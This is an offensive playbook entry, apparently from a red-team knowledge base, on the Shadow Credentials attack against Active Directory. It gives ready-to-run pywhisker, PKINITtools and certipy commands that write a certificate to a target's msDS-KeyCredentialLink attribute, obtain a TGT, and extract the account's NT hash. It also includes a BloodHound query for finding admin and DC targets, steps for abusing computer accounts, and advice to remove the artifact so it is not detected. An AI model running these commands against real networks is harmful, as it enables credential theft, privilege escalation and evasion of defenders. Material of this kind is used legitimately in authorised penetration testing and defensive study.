---
id: shadow-credentials
title: Shadow Credentials (KeyCredentialLink)
stage: privesc
tags: [windows, ad]
summary: Write a certificate credential to a user or computer object's KeyCredentialLink attribute — then authenticate via PKINIT to get that account's NT hash without changing its password.
leads_to:
  - pass-the-hash
  - domain-admin
  - dcsync
---

## Prerequisites

`GenericWrite` or `WriteProperty` over the target user or computer object (visible in BloodHound as these exact edge types). ADCS or at least a KDC that supports PKINIT (Windows Server 2016+). pywhisker or certipy to perform the write.

Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute, which stores certificate-based credentials for Windows Hello for Business. If you can write to this attribute on any account, you add your own certificate, then use it to authenticate via PKINIT — the KDC returns a TGT and, via U2U (user-to-user) authentication, the NT hash. Unlike ForceChangePassword, you don't modify the account's password, making this significantly stealthier.

## Quick Win

> Check BloodHound for GenericWrite edges to high-value targets first.

```bash
# BloodHound Cypher query
MATCH p=(u)-[:GenericWrite|WriteProperty]->(t:User|Computer)
WHERE t.name CONTAINS 'ADMIN' OR t.name CONTAINS 'DC'
RETURN p LIMIT 20
```

## Exploit with pywhisker (Linux)

```bash
# Add shadow credential to target account
python3 pywhisker.py -d $DOMAIN -u $USER -p $PASS \
  --target $TARGET_USER --action add

# Output: DeviceID, PFX file, and PFX password
# Authenticate via PKINIT
python3 PKINITtools/gettgtpkinit.py $DOMAIN/$TARGET_USER \
  -cert-pfx output.pfx -pfx-pass PASSWORD tgt.ccache

# Get NT hash via U2U
python3 PKINITtools/getnthash.py $DOMAIN/$TARGET_USER \
  -key TGT_SESSION_KEY
```

## Exploit with certipy

```bash
# Add shadow credentials
certipy shadow auto -u $USER@$DOMAIN -p $PASS \
  -account $TARGET_USER -dc-ip $DC_IP

# Certipy auto mode: adds cred, authenticates, returns NT hash in one command
# Output: $TARGET_USER NT hash: aad3b435...
```

## Computer Object Abuse

```bash
# GenericWrite over a computer → shadow credentials → machine account hash
certipy shadow auto -u $USER@$DOMAIN -p $PASS \
  -account 'MACHINE$' -dc-ip $DC_IP

# Machine account hash → RBCD or S4U2Self for local admin
```

## List / Clean Up

```bash
# List existing shadow credentials
python3 pywhisker.py -d $DOMAIN -u $USER -p $PASS \
  --target $TARGET_USER --action list

# Remove after use
python3 pywhisker.py -d $DOMAIN -u $USER -p $PASS \
  --target $TARGET_USER --action remove --device-id DEVICE_ID
```

## Leads To

NT hash of target user obtained → pass-the-hash with evil-winrm or wmiexec. If target is a DA account → domain-admin immediately. Machine account hash from computer object → S4U2Self to impersonate local admin, or DCSync if it's a DC machine account. Clean up the `msDS-KeyCredentialLink` entry afterward — it's a detectable artifact.
